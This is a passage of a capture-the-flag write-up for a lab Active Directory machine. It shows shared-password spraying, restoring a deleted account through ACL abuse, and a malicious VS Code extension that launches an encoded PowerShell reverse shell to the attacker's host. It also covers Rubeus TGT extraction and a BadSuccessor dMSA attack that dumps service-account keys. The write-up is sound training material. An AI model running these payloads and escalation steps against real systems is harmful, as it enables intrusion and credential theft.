+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[+] james.harper : Summer2024!</span><br><span class="line">[+] sarah.mitchell : Summer2024!</span><br><span class="line">[+] emily.carter : Summer2024!</span><br><span class="line">[+] david.reynolds : Summer2024!</span><br><span class="line">[+] jessica.coleman : Summer2024!</span><br><span class="line">[+] lauren.flores : Summer2024!</span><br><span class="line">[+] michael.torres : Summer2024!</span><br><span class="line">[+] kevin.patterson : Summer2024!</span><br><span class="line">[+] brian.jenkins : Summer2024!</span><br><span class="line">[+] megan.perry : Summer2024!</span><br></pre></td></tr></table></figure></div>
+
+<p>Ten out of sixteen accounts share the password <code>Summer2024!</code>, which is the usual signature of a batch of accounts created from a template and never forced to rotate.</p>
+<p>Here’s the honest part though: none of those ten get us anywhere on this box. They’re all in the same group as <code>alex.turner</code>, with the same rights and the same share access. I’m leaving the step in anyway, because it’s exactly the kind of thing you’d put near the top of a real report. Ten domain accounts with a shared, guessable, non-expiring password is a critical finding whether or not it happens to be on the intended path. But for Checkpoint the way forward isn’t a credential, it’s an ACL.</p>
+<h2 id="Finding-the-Real-Path-with-bloodyAD"><a href="#Finding-the-Real-Path-with-bloodyAD" class="headerlink" title="Finding the Real Path with bloodyAD"></a>Finding the Real Path with bloodyAD</h2><p>When BloodHound feels like overkill for a single credential, bloodyAD’s <code>get writable</code> is the fastest way to answer the only question that matters: what can this account actually change? It walks the directory and reports every object where the bound user has write access of some kind.</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p <span class="string">&#x27;Checkpoint2024!&#x27;</span> get writable</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb</span><br><span class="line">DACL: WRITE</span><br><span class="line"></span><br><span class="line">distinguishedName: OU=Employees,DC=checkpoint,DC=htb</span><br><span class="line">permission: CREATE_CHILD</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb</span><br><span class="line">permission: WRITE</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb</span><br><span class="line">permission: WRITE</span><br></pre></td></tr></table></figure></div>
+
+<p>Four results, and the ones at the top and bottom are the whole box.</p>
+<p><code>CN=Deleted Objects</code> is the AD Recycle Bin container. When an object is deleted on a domain with the Recycle Bin enabled it isn’t destroyed. It gets stripped of most attributes, renamed with that <code>\0ADEL:&lt;objectGUID&gt;</code> suffix, flagged <code>isDeleted=TRUE</code> and parked in this container until the tombstone lifetime expires. The important bit is that the Recycle Bin preserves link-valued and non-link-valued attributes, and that includes <code>unicodePwd</code>. A restored object comes back with the password it had when it was deleted.</p>
+<p>By default <code>CN=Deleted Objects</code> is readable and writable by Domain Admins only, and a regular user can’t even list it. Here <code>alex.turner</code> has <code>WRITE</code> on the container plus <code>WRITE</code> on one specific tombstone sitting inside it, helpfully named <strong>Mark Davies</strong>. That pairing is the giveaway. Whoever built this box wanted that object restored.</p>
+<p>And we have everything we need to do it. Restoring a tombstone is really just clearing <code>isDeleted</code> and moving the object to a live container, which requires write on the deleted object (we have it) plus <code>CREATE_CHILD</code> on the destination container, which is <code>OU=Employees</code>, the second result. The two ACLs are useless apart and sufficient together.</p>
+<h2 id="Restoring-a-Tombstoned-Account"><a href="#Restoring-a-Tombstoned-Account" class="headerlink" title="Restoring a Tombstoned Account"></a>Restoring a Tombstoned Account</h2><p>bloodyAD wraps the whole thing in one operation. We pass the tombstone’s full DN, including the <code>\0ADEL:</code> GUID suffix:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p <span class="string">&#x27;Checkpoint2024!&#x27;</span> \</span><br><span class="line">  <span class="built_in">set</span> restore <span class="string">&#x27;CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb</span><br></pre></td></tr></table></figure></div>
+
+<p>The account is alive again in <code>OU=Employees</code>. Now for the part that makes this attack worth knowing. The restored object kept its old password, and on this domain that happens to be the same one we were given for <code>alex.turner</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //dc01.checkpoint.htb/ -U <span class="string">&quot;checkpoint.htb\\mark.davies%Checkpoint2024!&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Sharename       Type      Comment</span><br><span class="line">---------       ----      -------</span><br><span class="line">DevDrop         Disk      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0</span><br><span class="line">VMBackups       Disk</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
+
+<p>We authenticate straight away, no password reset needed, which also means no <code>pwdLastSet</code> change and nothing for a defender to notice in the obvious place.</p>
+<p>So what did we actually gain? <code>alex.turner</code> could read <code>DevDrop</code> but not write to it. Let’s see if <code>mark.davies</code> is any different:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="built_in">test</span> &gt; /tmp/test.txt</span><br><span class="line">smbclient //dc01.checkpoint.htb/DevDrop -U <span class="string">&quot;checkpoint.htb\\mark.davies%Checkpoint2024!&quot;</span> \</span><br><span class="line">  -c <span class="string">&#x27;put /tmp/test.txt test.txt; ls&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">putting file /tmp/test.txt as \test.txt (0.2 kB/s)</span><br><span class="line">  test.txt          A       5</span><br></pre></td></tr></table></figure></div>
+
+<p>Write access confirmed. The restored account’s group membership is the entire point of resurrecting it. Clean up the test file with <code>rm test.txt</code> before we drop anything real in there.</p>
+<h2 id="Foothold-Malicious-VS-Code-Extension"><a href="#Foothold-Malicious-VS-Code-Extension" class="headerlink" title="Foothold - Malicious VS Code Extension"></a>Foothold - Malicious VS Code Extension</h2><p>A <code>.vsix</code> package isn’t a special format. It’s a zip archive with a top-level <code>[Content_Types].xml</code> and an <code>extension/</code> directory containing <code>package.json</code> (the manifest) and the entrypoint JavaScript. When VS Code loads an extension it calls the exported <code>activate()</code> function, and extensions run as fully-trusted Node.js with <code>child_process</code> available. There’s no sandbox. So putting a <code>cp.exec()</code> in <code>activate()</code> gives us code execution as whichever user’s VS Code instance loads the package.</p>
+<p>Two details from the share comment matter when building it. The <code>engines.vscode</code> field has to be compatible with <code>1.118.0</code> or VS Code will refuse to activate the extension, and <code>activationEvents</code> needs <code>*</code> so it fires on load instead of waiting for some language or command trigger.</p>
+<p>Let’s build it. We start with a standard PowerShell TCP reverse shell, UTF-16LE encode it and base64 it so it survives being embedded in a JavaScript string and passed to <code>powershell -e</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LHOST=10.10.17.22  LPORT=4445</span><br><span class="line">PAYLOAD=<span class="string">&quot;\$client = New-Object System.Net.Sockets.TCPClient(&#x27;<span class="variable">$&#123;LHOST&#125;</span>&#x27;,<span class="variable">$&#123;LPORT&#125;</span>);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%&#123;0&#125;;while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0)&#123;;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2&gt;&amp;1 | Out-String );\$sendback2 = \$sendback + &#x27;PS &#x27; + (pwd).Path + &#x27; &gt; &#x27;;\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()&#125;;\$client.Close()&quot;</span></span><br><span class="line">ENCODED=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$PAYLOAD</span>&quot;</span> | iconv -t UTF-16LE | <span class="built_in">base64</span> -w 0)</span><br></pre></td></tr></table></figure></div>
+
+<p>Then the extension skeleton. The manifest advertises itself as a harmless developer tool and <code>extension.js</code> does the actual work in three lines:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /tmp/evil-ext/extension</span><br><span class="line"><span class="built_in">cd</span> /tmp/evil-ext</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt; extension/package.json &lt;&lt; <span class="string">&#x27;MANIFEST&#x27;</span></span><br><span class="line">&#123; <span class="string">&quot;name&quot;</span>:<span class="string">&quot;devtools-helper&quot;</span>, <span class="string">&quot;displayName&quot;</span>:<span class="string">&quot;DevTools Helper&quot;</span>,</span><br><span class="line">  <span class="string">&quot;version&quot;</span>:<span class="string">&quot;1.0.0&quot;</span>, <span class="string">&quot;engines&quot;</span>:&#123;<span class="string">&quot;vscode&quot;</span>:<span class="string">&quot;^1.118.0&quot;</span>&#125;,</span><br><span class="line">  <span class="string">&quot;activationEvents&quot;</span>:[<span class="string">&quot;*&quot;</span>], <span class="string">&quot;main&quot;</span>:<span class="string">&quot;./extension.js&quot;</span> &#125;</span><br><span class="line">MANIFEST</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt; extension/extension.js &lt;&lt; <span class="string">PAYLOADJS</span></span><br><span class="line"><span class="string">const cp = require(&#x27;child_process&#x27;);</span></span><br><span class="line"><span class="string">exports.activate = function() &#123; cp.exec(&#x27;powershell -e $&#123;ENCODED&#125;&#x27;); &#125;</span></span><br><span class="line"><span class="string">exports.deactivate = function() &#123;&#125;</span></span><br><span class="line"><span class="string">PAYLOADJS</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt; <span class="string">&#x27;[Content_Types].xml&#x27;</span> &lt;&lt; <span class="string">&#x27;CTYPES&#x27;</span></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="line">&lt;Types xmlns=<span class="string">&quot;http://schemas.openxmlformats.org/package/2006/content-types&quot;</span>&gt;</span><br><span class="line">  &lt;Default Extension=<span class="string">&quot;json&quot;</span> ContentType=<span class="string">&quot;application/json&quot;</span>/&gt;</span><br><span class="line">  &lt;Default Extension=<span class="string">&quot;js&quot;</span> ContentType=<span class="string">&quot;application/javascript&quot;</span>/&gt;</span><br><span class="line">&lt;/Types&gt;</span><br><span class="line">CTYPES</span><br></pre></td></tr></table></figure></div>
+
+<p>Zip it with the three paths in the right places and we have a valid package:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import zipfile,os; os.chdir(&#x27;/tmp/evil-ext&#x27;);</span></span><br><span class="line"><span class="string">z=zipfile.ZipFile(&#x27;/tmp/evil.vsix&#x27;,&#x27;w&#x27;,zipfile.ZIP_DEFLATED);</span></span><br><span class="line"><span class="string">[z.write(f) for f in [&#x27;[Content_Types].xml&#x27;,&#x27;extension/package.json&#x27;,&#x27;extension/extension.js&#x27;]];</span></span><br><span class="line"><span class="string">z.close()&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Before dropping it we need a listener, and a plain <code>nc -lvnp 4445</code> is a bad idea here. The callback is a PowerShell shell we’ll want to drive for a while, and if we’re going to background it, keep it across tool invocations or feed it commands from scripts, a bare netcat that owns our terminal’s stdin gets painful fast. A FIFO-backed listener solves that. <code>tail -f</code> keeps the write end of the pipe open forever, so commands can be echoed into the FIFO from anywhere and output piles up in a file we can <code>tail</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkfifo</span> /tmp/cp_in</span><br><span class="line"><span class="built_in">nohup</span> bash -c <span class="string">&#x27;tail -f /tmp/cp_in | nc -lvnp 4445 &gt; /tmp/cp_out 2&gt;&amp;1&#x27;</span> &amp;</span><br></pre></td></tr></table></figure></div>
+
+<p>Now upload the extension to <code>DevDrop</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient //dc01.checkpoint.htb/DevDrop -U <span class="string">&quot;checkpoint.htb\\mark.davies%Checkpoint2024!&quot;</span> \</span><br><span class="line">  -c <span class="string">&#x27;put /tmp/evil.vsix devtools-helper.vsix&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>And wait. <code>DevDrop</code> is polled by a scheduled VS Code instance that installs any <code>.vsix</code> it finds, so roughly fifteen seconds after the upload:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tail</span> -f /tmp/cp_out</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Listening on 0.0.0.0 4445</span><br><span class="line">Connection received on 10.129.25.119 58190</span><br><span class="line">checkpoint\ryan.brooks</span><br><span class="line">DC01</span><br><span class="line">PS C:\Program Files\Microsoft VS Code &gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>Shell on the DC. Note who we are: <code>ryan.brooks</code>, not <code>mark.davies</code>. We wrote the file as mark, but the process that consumed it belongs to ryan, and child processes inherit the token of whoever spawned them. That’s worth remembering as a pattern. When you find a directory you can write to, the question isn’t what you can do with it, it’s who else reads from it and what they run on your behalf.</p>
+<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;type C:\Users\ryan.brooks\Desktop\user.txt&#x27;</span> &gt; /tmp/cp_in</span><br><span class="line"><span class="built_in">sleep</span> 4; <span class="built_in">tail</span> -5 /tmp/cp_out</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Program Files\Microsoft VS Code &gt; 96be0e6161e0911adc41e06444f0ce7e</span><br></pre></td></tr></table></figure></div>
+
+<p>And there’s the user flag: <code>96be0e6161e0911adc41e06444f0ce7e</code>.</p>
+<h2 id="Privilege-Escalation-BetterSuccessor"><a href="#Privilege-Escalation-BetterSuccessor" class="headerlink" title="Privilege Escalation - BetterSuccessor"></a>Privilege Escalation - BetterSuccessor</h2><p>Same question as before with a new identity: what can <code>ryan.brooks</code> write to? There’s a wrinkle this time though. We have a shell as ryan but we never recovered his password, and bloodyAD needs to bind to LDAP as him. So before we can enumerate anything we need a Kerberos ticket, and we’ll pull it out of the shell itself.</p>
+<h3 id="Getting-a-ticket-for-ryan-with-tgtdeleg"><a href="#Getting-a-ticket-for-ryan-with-tgtdeleg" class="headerlink" title="Getting a ticket for ryan with tgtdeleg"></a>Getting a ticket for ryan with tgtdeleg</h3><p>Stage Rubeus from a quick Python HTTP server on our box and run <code>tgtdeleg</code>:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ws</span> = <span class="built_in">New-Object</span> Net.WebClient</span><br><span class="line"><span class="variable">$ws</span>.DownloadFile(<span class="string">&#x27;http://10.10.17.22:8000/Rubeus.exe&#x27;</span>,<span class="string">&#x27;C:\Windows\Tasks\rubeus.exe&#x27;</span>)</span><br><span class="line">C:\Windows\Tasks\rubeus.exe tgtdeleg /nowrap</span><br></pre></td></tr></table></figure></div>
+
+<p><code>tgtdeleg</code> is a neat trick and worth understanding rather than just running. It kicks off a fake GSSAPI delegation handshake against <code>cifs/DC01</code>, asking for a ticket with delegation. Because the handshake requests a forwarded TGT, the KDC embeds the user’s own TGT inside the AP-REQ authenticator, and since that authenticator is encrypted with the service-ticket session key our own process already holds, we can decrypt it and walk away with the plaintext TGT. No <code>SeDebugPrivilege</code>, no LSASS access, no elevation at all. Any user can extract their own TGT this way, which is why it’s the right tool when you have a shell but no password.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] Successfully decrypted the authenticator</span><br><span class="line">[*] base64(ticket.kirbi):</span><br><span class="line">      doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNI...</span><br></pre></td></tr></table></figure></div>
+
+<p>Decode the blob and convert the <code>.kirbi</code> into a ccache that Impacket and bloodyAD can use:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&#x27;&lt;base64-blob&gt;&#x27;</span> | <span class="built_in">base64</span> -d &gt; /tmp/ryan.kirbi</span><br><span class="line">ticketConverter.py /tmp/ryan.kirbi /tmp/ryan.ccache</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=/tmp/ryan.ccache</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Fixing-the-clock-skew"><a href="#Fixing-the-clock-skew" class="headerlink" title="Fixing the clock skew"></a>Fixing the clock skew</h3><p>Before any Kerberos-authenticated tool runs, deal with the skew. Kerberos rejects an AP-REQ whose timestamp is more than five minutes off the KDC’s clock, and this DC was running seven hours ahead of local time. Skip this and you’ll get <code>KRB_AP_ERR_SKEW</code> and waste time blaming the ticket:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">date</span> -s <span class="string">&quot;<span class="subst">$(date -u -d &#x27;+7 hours&#x27; &#x27;+%Y-%m-%d %H:%M:%S UTC&#x27;)</span>&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="What-ryan-can-write-to"><a href="#What-ryan-can-write-to" class="headerlink" title="What ryan can write to"></a>What ryan can write to</h3><p>Now the same bloodyAD query as before, this time authenticating with the ticket:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k --dc-ip 10.129.25.119 get writable</span><br></pre></td></tr></table></figure></div>
+
+<p>The interesting hit is <code>CREATE_CHILD</code> on <code>OU=DMSAHolder,DC=checkpoint,DC=htb</code>. An OU that exists to hold <strong>delegated Managed Service Accounts</strong>, and we can create objects in it.</p>
+<p>That’s the precondition for <strong>BadSuccessor</strong>. The short version: Server 2025 introduced dMSAs with a migration feature, where a new dMSA can be marked as the successor to an existing account. When a dMSA authenticates, the KDC looks at its superseded-account link and, to make the migration seamless, hands back the key material of the account it supersedes inside the TGS. Nothing checks whether the migration was legitimate, so anyone who can create a dMSA and point its superseded link at a target account gets that account’s keys. <code>CREATE_CHILD</code> on an OU is the only right required, which is why this one made so much noise when Akamai published it.</p>
+<p>Microsoft’s patch tightened the original attribute flow, but the <strong>BetterSuccessor</strong> variant works post-patch by also writing the two attributes the original PoC skipped, <code>msDS-SupersededServiceAccountState=2</code> and <code>msDS-SupersededManagedAccountLink=&lt;target DN&gt;</code>. Together those rebuild the state the KDC expects from a migration that’s genuinely in progress. bloodyAD’s <code>add badSuccessor</code> module handles both flows.</p>
+<h3 id="Weaponising-the-dMSA"><a href="#Weaponising-the-dMSA" class="headerlink" title="Weaponising the dMSA"></a>Weaponising the dMSA</h3><p>Now we create a dMSA in the OU we control and point it at <code>svc_deploy</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k --dc-ip 10.129.25.119 \</span><br><span class="line">  add badSuccessor evil_dmsa5 \</span><br><span class="line">  --ou <span class="string">&#x27;OU=DMSAHolder,DC=checkpoint,DC=htb&#x27;</span> \</span><br><span class="line">  -t <span class="string">&#x27;CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[+] Creating DMSA evil_dmsa5$ in OU=DMSAHolder,DC=checkpoint,DC=htb</span><br><span class="line">[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb</span><br><span class="line"></span><br><span class="line">Realm        : CHECKPOINT.HTB</span><br><span class="line">Sname        : krbtgt/CHECKPOINT.HTB</span><br><span class="line">UserName     : evil_dmsa5$</span><br><span class="line">StartTime    : 2026-06-17 02:52:24+00:00</span><br><span class="line">EndTime      : 2026-06-17 12:49:42+00:00</span><br><span class="line">Keytype      : 18</span><br><span class="line">Key          : nF0p7sSp6fGwQsgvpdbxWxAtkQgfnfeEX/xwm/wUwGY=</span><br><span class="line">EncodedKirbi : doIF7jCCBeqgAwIBBaEDAgEWooIE2DCCBNRhggTQMIIEzKADAgEFoRAbDkNIRUNLUE...</span><br><span class="line"></span><br><span class="line">[+] dMSA TGT stored in ccache file evil_dmsa5_40.ccache</span><br><span class="line"></span><br><span class="line">dMSA current keys found in TGS:</span><br><span class="line">AES256: bf66e34c42e87b311e564c9fc746f3562f9d470bbcd9453345e0132bd6d9dcdd</span><br><span class="line">AES128: 96b14d19737bf395bd51709ad20043ac</span><br><span class="line">RC4:    7f92e8a1a7e2431de5366deb196460f6</span><br><span class="line"></span><br><span class="line">dMSA previous keys found in TGS (including keys of preceding managed accounts):</span><br><span class="line">RC4:    e16081eb077aca74bdbf8af12af43ac9</span><br></pre></td></tr></table></figure></div>
+
+<p>That last block is the payoff. The “current keys” belong to the dMSA we just created, which is worthless on its own since it’s a brand new account with access to nothing. The previous keys are the ones we want. They’re inherited from the preceding-managed-account chain and they’re <code>svc_deploy</code>‘s actual key material. We never touched that account, never reset its password, never read a single attribute off it. The KDC handed its keys over because we claimed a migration and nothing validated the claim.</p>
+<p>More useful right now, bloodyAD also wrote out a TGT for the dMSA, and that ticket carries svc_deploy’s authorisation data, so we can just use it directly.</p>
+<h2 id="Reading-VMBackups-as-the-dMSA"><a href="#Reading-VMBackups-as-the-dMSA" class="headerlink" title="Reading VMBackups as the dMSA"></a>Reading VMBackups as the dMSA</h2><p>Remember the <code>VMBackups</code> share nobody could read. <code>svc_deploy</code> can, and through the dMSA ticket, so can we:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> evil_dmsa5_40.ccache /tmp/dmsa.ccache</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=/tmp/dmsa.ccache</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;use VMBackups\nls\n&quot;</span> | smbclient.py -k -no-pass \</span><br><span class="line">  <span class="string">&#x27;CHECKPOINT.HTB/evil_dmsa5$@DC01.CHECKPOINT.HTB&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drw-rw-rw-          0  Wed May 13 13:58:18 2026 NightlyBackup_2024-11-01</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;use VMBackups\ncd &#x27;NightlyBackup_2024-11-01/memory forensics&#x27;\nls\n&quot;</span> | smbclient.py -k -no-pass \</span><br><span class="line">  <span class="string">&#x27;CHECKPOINT.HTB/evil_dmsa5$@DC01.CHECKPOINT.HTB&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-rw-rw-rw-  106496000  Windows Server 2019-000001.vmdk</span><br><span class="line">-rw-rw-rw- 2147483648  Windows Server 2019-Snapshot1.vmem</span><br><span class="line">-rw-rw-rw-  138164859  Windows Server 2019-Snapshot1.vmsn</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
+
+<p>A directory called <code>memory forensics</code> with a 2 GB <code>.vmem</code> in it. For anyone who hasn’t run into VMware’s file layout, a <code>.vmem</code> is the guest’s entire physical RAM, written to disk as-is when the VM is suspended or snapshotted. Every secret the running OS had in memory at that moment is in that file, including all of <code>lsass.exe</code>, and this is a snapshot of the domain controller itself.</p>
+<p>Backups of a DC are domain-admin equivalent, and a RAM snapshot is worse than a disk backup because disk at least keeps the secrets encrypted at rest.</p>
+<h2 id="Dumping-the-Administrator-Hash-with-Volatility3"><a href="#Dumping-the-Administrator-Hash-with-Volatility3" class="headerlink" title="Dumping the Administrator Hash with Volatility3"></a>Dumping the Administrator Hash with Volatility3</h2><p>Pull the file down. It’s 2 GB so this takes a few minutes:</p>
